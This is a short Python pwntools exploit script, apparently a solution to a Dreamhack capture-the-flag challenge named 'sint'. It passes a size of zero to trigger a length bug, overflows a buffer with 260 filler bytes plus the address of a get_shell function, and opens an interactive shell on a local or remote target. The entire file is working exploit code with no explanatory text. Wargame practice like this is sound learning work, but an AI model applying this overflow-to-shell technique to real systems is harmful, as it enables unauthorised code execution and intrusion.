from pwn import *
import sys

context.log_level='debug'

if len(sys.argv)!=2:
    log.info("try 'python ex.py -l' for local")
    log.info("try 'python ex.py -r' for remote")
    exit(0)

if sys.argv[1]=="-r":
    p = remote('host1.dreamhack.games',13860)
elif sys.argv[1]=="-l":
    p = process('sint')
else:
    log.info("options: -l for local, -r for remote")
    exit(0)

e=ELF('sint')

get_shell=e.symbols['get_shell']

log.info('get_shell address: '+hex(get_shell))

payload="A"*256
payload+="B"*4
payload+=p32(get_shell)

p.sendlineafter("Size: ","0")

p.sendlineafter("Data: ",payload)

p.interactive()